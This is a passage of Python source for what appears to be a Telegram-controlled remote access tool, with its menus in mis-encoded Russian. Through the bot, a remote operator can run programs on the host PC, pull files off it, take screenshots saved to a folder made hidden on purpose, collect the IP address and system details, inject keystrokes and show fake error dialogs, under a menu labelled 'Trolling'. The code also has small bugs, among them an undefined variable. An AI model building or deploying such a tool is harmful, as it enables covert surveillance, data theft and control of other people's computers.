        item0=types.KeyboardButton("–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫")
        item1=types.KeyboardButton("–£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫")
        item2=types.KeyboardButton("–ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤")
        item3=types.KeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª/–ø—Ä–æ–≥—Ä–∞–º–º—É")
        item4=types.KeyboardButton("–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –ü–ö")
        item5=types.KeyboardButton("–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ü–ö")
        item6=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '*üóÇ –í—ã –≤ –º–µ–Ω—é —Ñ–∞–π–ª–æ–≤!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_files)

def check_files(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):  
        if message.text.strip() == '–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("–°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª")
            item1=types.KeyboardButton("–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É")
            item2=types.KeyboardButton("–ù–∞–∑–∞–¥")
            markup.add(item0)
            markup.add(item1)
            markup.add(item2)

            bot.send_message(message.chat.id, '*‚úçÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –∏–ª–∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞–∑–∞–¥!*', reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(message, check_create)

        elif message.text.strip() == '–ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤': 
            change_file(message)

        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            mainmenu(message)

        elif message.text.strip() == '–£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫':
            delete_file5545(message)

        elif message.text.strip() == '/start':
            start(message)

        elif message.text.strip() == '–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª/–ø—Ä–æ–≥—Ä–∞–º–º—É':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("–ù–∞–∑–∞–¥")
            markup.add(item0)

            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt), –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å!*', reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(message, open_file)

        elif message.text.strip() == '–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –ü–ö':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("–ù–∞–∑–∞–¥")
            markup.add(item0)

            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt), –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å (–¥–æ 50 –º–±)*', reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(message, download_file)

        elif message.text.strip() == '–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ü–ö':
            download_on_pc1(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            files(message)


def check_create(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª':
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt)!*', parse_mode="Markdown")
            bot.register_next_step_handler(message, sozd_file)

        elif message.text.strip() == '–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É':
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –Ω–æ–≤–æ–π –ø–∞–ø–∫–µ –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ –µ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ, –µ—Å–ª–∏ —Ö–æ—Ç–∏—Ç–µ –µ–µ —Å–æ–∑–¥–∞—Ç—å –≤ –º–µ—Å—Ç–µ, –≥–¥–µ –∑–∞–ø—É—â–µ–Ω —Å–∫—Ä–∏–ø—Ç\n\n‚ùóÔ∏è –ü—Ä–∏–º–µ—Ä –ø—É—Ç–∏: C:\\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞*', parse_mode="Markdown")
            bot.register_next_step_handler(message, create_folder)

        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            files(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode="Markdown")
            files(message)

def create_folder(message):
    try:
        route = message.text.strip()

        if route == '/start':
            return start(message)

        os.mkdir(str(route))

        bot.send_message(message.chat.id, f'*‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ "{route}" –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*', parse_mode="Markdown")
        return files(message)

    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –º–µ—Å—Ç–∞*', parse_mode="Markdown")
        return files(message)



def download_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            route = message.text.strip()
            
            if route == '/start':
                return start(message)

            elif str(route) == '–ù–∞–∑–∞–¥':
                return files(message)

            photo = open(str(route), 'rb')
            bot.send_document(message.chat.id, photo)
            files(message)

        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
            files(message)





def open_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            path = message.text.strip()
            if message.text.strip() == "/start":
                start(message)

            elif str(name) == '–ù–∞–∑–∞–¥':
                files(message)
            
            else:
                os.startfile(str(path))
                bot.send_message(message.chat.id, f'*‚òëÔ∏è –§–∞–π–ª {path} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*', parse_mode="Markdown")
                files(message)

        except:
            bot.send_message(message.chat.id, '‚ùå *–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!* –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', parse_mode="Markdown")
            files(message)





def create_error(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global zagl
        zagl = message.text.strip()

        if zagl == '/start':
            return start(message)

        bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–ø–∏—à–∏—Ç–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –æ—à–∏–±–∫–∏!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, create_error2)

def create_error2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global zagl
        sod = message.text.strip()

        if sod == '/start':
            return start(message)

        bot.send_message(message.chat.id, '‚ùóÔ∏è *–û—à–∏–±–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*', parse_mode='Markdown')
        console_menu(message)
        ctypes.windll.user32.MessageBoxW(0, sod, zagl, 0)





def console_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–í–≤–æ–¥ –∫–æ–º–∞–Ω–¥")
        item1=types.KeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç—å Python —Å–∫—Ä–∏–ø—Ç")
        item2=types.KeyboardButton("–°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
        item3=types.KeyboardButton("–û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç")
        item4=types.KeyboardButton("–°–æ–∑–¥–∞—Ç—å –æ—à–∏–±–∫—É")
        item5=types.KeyboardButton("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö")
        item6=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, 'üíª *–í—ã –≤ –º–µ–Ω—é –∫–æ–Ω—Å–æ–ª–∏!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, console_check)

def console_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–í–≤–æ–¥ –∫–æ–º–∞–Ω–¥': 
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("tasklist")
            item1=types.KeyboardButton("ping")
            item5=types.KeyboardButton("–ù–∞–∑–∞–¥")
            markup.add(item0)
            markup.add(item1)
            markup.add(item5)
            bot.send_message(message.chat.id, 'üñ• *–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏!\n\n‚ùóÔ∏è –ü—Ä–∏ –ª—é–±—ã—Ö –Ω–µ–ø–æ–Ω—è—Ç–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏—è—Ö –≤–≤–æ–¥–∏—Ç–µ /start*', reply_markup=markup, parse_mode='Markdown')
            bot.register_next_step_handler(message, powershell_cmd)


        elif message.text.strip() == '–°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç':
            try:
                if os.path.exists('C:\\temp\\') == False:
                    fileName = r'C:\temp'
                    os.mkdir(fileName)
                    kernel32 = ctypes.windll.kernel32
                    attr = kernel32.GetFileAttributesW(fileName)
                    kernel32.SetFileAttributesW(fileName, attr | 2)

                pyautogui.screenshot('C:\\temp\\screenshot1.png')
                bot.send_document(message.chat.id, open('C:\\temp\\screenshot1.png', 'rb'))
                console_menu(message)

            except PermissionError:
                bot.send_message(message.chat.id, '‚ùå *–£ –±–æ—Ç–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤!*', parse_mode='Markdown')
                console_menu(message)

        elif message.text.strip() == '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö':
            active_window = pygetwindow.getActiveWindowTitle()
            if active_window == None or active_window == '':
                active_window = '–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª'

            bot.send_message(chat_id, f'‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{zapusk}*\nüíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{oper[0]} {oper[2]} {oper[3]}*\nüßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{oper[5]}*\nüîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *' + str(ip)[2:-1] + f'*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{width}x{height}*\nüìÄ –ü–∞–º—è—Ç—å: ' + '*{:6.2f}* –ì–ë'.format(total_mem/gb) + " –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{:6.2f}* –ì–ë".format(free_mem/gb) + f"\n*üñº –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ - {active_window}*", parse_mode="Markdown")
            console_menu(message)

        elif message.text.strip() == '–°–æ–∑–¥–∞—Ç—å –æ—à–∏–±–∫—É':
            bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –æ—à–∏–±–∫–∏!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, create_error)

        elif message.text.strip() == '–ó–∞–ø—É—Å—Ç–∏—Ç—å Python —Å–∫—Ä–∏–ø—Ç':
            bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, python_scripts)

        elif message.text.strip() == '–û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("–ù–∞–∑–∞–¥")
            markup.add(item0)

            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å —Å–∞–π—Ç–∞!*', reply_markup=markup, parse_mode='Markdown')
            bot.register_next_step_handler(message, open_site)


        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            mainmenu(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            console_menu(message)





def open_site(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–ù–∞–∑–∞–¥':
            console_menu(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            try:
                whatopen = message.text.strip()
                webbrowser.open(str(whatopen), new=1)
                bot.send_message(message.chat.id, f'‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã–ª–∏ {whatopen}*', parse_mode='Markdown')
                console_menu(message)

            except:
                bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ*', parse_mode='Markdown')
                console_menu()



def media_buttons(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–ü–∞—É–∑–∞/–°—Ç–∞—Ä—Ç")
        item1=types.KeyboardButton("–ü–µ—Ä–µ–º–æ—Ç–∫–∞ –≤–ø–µ—Ä—ë–¥")
        item2=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í—ã –≤ –º–µ–Ω—é –º–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, mediabuttons_check)


def mediabuttons_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–ü–∞—É–∑–∞/–°—Ç–∞—Ä—Ç':
            keyboard.send('play/pause media')
            return media_buttons(message)

        elif message.text.strip() == '–ü–µ—Ä–µ–º–æ—Ç–∫–∞ –≤–ø–µ—Ä—ë–¥':
            keyboard.send('alt+right')
            return media_buttons(message)

        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            return keyboard_menu(message)

        else:
            return media_buttons(message)





def keyboard_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —á—Ç–æ-—Ç–æ")
        item1=types.KeyboardButton("–ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à–∏")
        item2=types.KeyboardButton("–ú–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à–∏")
        item3=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í—ã –≤ –º–µ–Ω—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, keyboard_check)

def keyboard_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–ù–∞–∑–∞–¥':
            mainmenu(message)

        elif message.text.strip() == '–ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —á—Ç–æ-—Ç–æ':
            keyboard_word(message)

        elif message.text.strip() == '–ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à–∏':
            keyboard_keys(message)

        elif message.text.strip() == '–ú–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à–∏':
            media_buttons(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            keyboard_menu(message)





def keyboard_word(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("enter")
        item1=types.KeyboardButton("backspace")
        item2=types.KeyboardButton("space")
        item3=types.KeyboardButton("tab")
        item4=types.KeyboardButton("ctrl+c")
        item5=types.KeyboardButton("ctrl+a")
        item6=types.KeyboardButton("ctrl+v")
        item7=types.KeyboardButton("ctrl+z")
        item8=types.KeyboardButton("ctrl+s")
        item9=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        markup.add(item7)
        markup.add(item8)
        markup.add(item9)
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í–ø–∏—à–∏—Ç–µ —Ç–æ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç—å, –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –∫–ª–∞–≤–∏—à–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ –Ω–∏–∂–µ!\n–í–ø–∏—Å–∞—Ç—å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–µ –≤—ã –º–æ–∂–µ—Ç –ø–æ –ø—Ä–∏–º–µ—Ä—É –Ω–∏–∂–µ:\nalt+f4, enter - –Ω–∞–∂–º–µ—Ç—Å—è alt+f4 –≤–º–µ—Å—Ç–µ, –∞ —Ç–æ–ª—å–∫–æ –ø–æ—Ç–æ–º enter*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, keyboard_word2)

def keyboard_word2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == "–ù–∞–∑–∞–¥":
            keyboard_menu(message)
        
        elif message.text.strip() == '/start':
            start(message)

        elif message.text.strip() == "enter":
            keyboard.press("enter")
            keyboard_word(message)

        elif message.text.strip() == "backspace":
            keyboard.press("backspace")
            keyboard_word(message)

        elif message.text.strip() == "space":
            keyboard.press("space")
            keyboard_word(message)

        elif message.text.strip() == "tab":
            keyboard.press("tab")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+a":
            keyboard.press("ctrl+a")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+z":
            keyboard.press("ctrl+z")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+c":
            keyboard.press("ctrl+c")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+v":
            keyboard.press("ctrl+v")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+s":
            keyboard.press("ctrl+s")
            keyboard_word(message)

        else:
            word = message.text.strip()
            keyboard.write(word, delay=0.25)
            keyboard_word(message)





def keyboard_keys(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("ctrl+shift+esc")
        item1=types.KeyboardButton("alt+tab")
        item2=types.KeyboardButton("alt+F4")
        item3=types.KeyboardButton("win+e")
        item4=types.KeyboardButton("tab")
        item5=types.KeyboardButton("del")
        item6=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í–ø–∏—à–∏—Ç–µ –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –Ω–∏–∂–µ —Ç–æ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, keyboard_keys2)

def keyboard_keys2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == "–ù–∞–∑–∞–¥":
                keyboard_menu(message)

            elif message.text.strip() == '/start':
                start(message)

            else:
                word = message.text.strip()
                keyboard.send(word)
                keyboard_keys(message)
        
        except ValueError:
            bot.send_message(message.chat.id, '‚ùå *–û–¥–Ω–∞ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–∑ –∫–ª–∞–≤–∏—à –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            keyboard_keys(message)



def samp_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ SAMP —Å–µ—Ä–≤–µ—Ä—É")
        item1=types.KeyboardButton("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ RakLaunch Lite")   
        item2=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        bot.send_message(message.chat.id, '*üòá –í—ã –≤ –º–µ–Ω—é SAMP!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, samp_check)

def samp_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        cmd = message.text.strip()

        if cmd == "–ù–∞–∑–∞–¥":
            mainmenu(message)

        elif cmd == "/start":
            start(message)

        elif message.text.strip() == '–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ SAMP —Å–µ—Ä–≤–µ—Ä—É':
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ IP —Å–µ—Ä–≤–µ—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ –∑–∞–π—Ç–∏!\n\nP.s. –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –Ω–∏–∫, –ø–æ–¥ –∫–æ—Ç–æ—Ä—ã–º –≤—ã –∏–≥—Ä–∞–ª–∏ –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–π —Ä–∞–∑!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, samp_connect)

        elif message.text.strip() == '–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ RakLaunch Lite':
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ —Ñ–æ—Ä–º–µ –Ω–∏–∂–µ:\nnickname,ip,port\n–ü—Ä–∏–º–µ—Ä: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown')
            bot.register_next_step_handler(message, raklite_connect)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            samp_menu(message)





def mainmenu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("/start")
        item1=types.KeyboardButton("–ö–æ–Ω—Å–æ–ª—å")   
        item2=types.KeyboardButton("–§–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏")
        item3=types.KeyboardButton("–ö–ª–∞–≤–∏—à–∏")
        item4=types.KeyboardButton("–¢—Ä–æ–ª–ª–∏–Ω–≥")
        item5=types.KeyboardButton("SAMP —Ñ—É–Ω–∫—Ü–∏–∏")
        item6=types.KeyboardButton("–û—Å–æ–±—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '*üìå –í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_main)

def check_main(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–§–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏':
            files(message)

        elif message.text.strip() == '–ö–æ–Ω—Å–æ–ª—å':
            console_menu(message)

        elif message.text.strip() == '/start':
            start(message)

        elif message.text.strip() == '–ö–ª–∞–≤–∏—à–∏':
            keyboard_menu(message)
        
        elif message.text.strip() == '–¢—Ä–æ–ª–ª–∏–Ω–≥':
            packs(message)

        elif message.text.strip() == '–û—Å–æ–±—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏':
            other_functions(message)

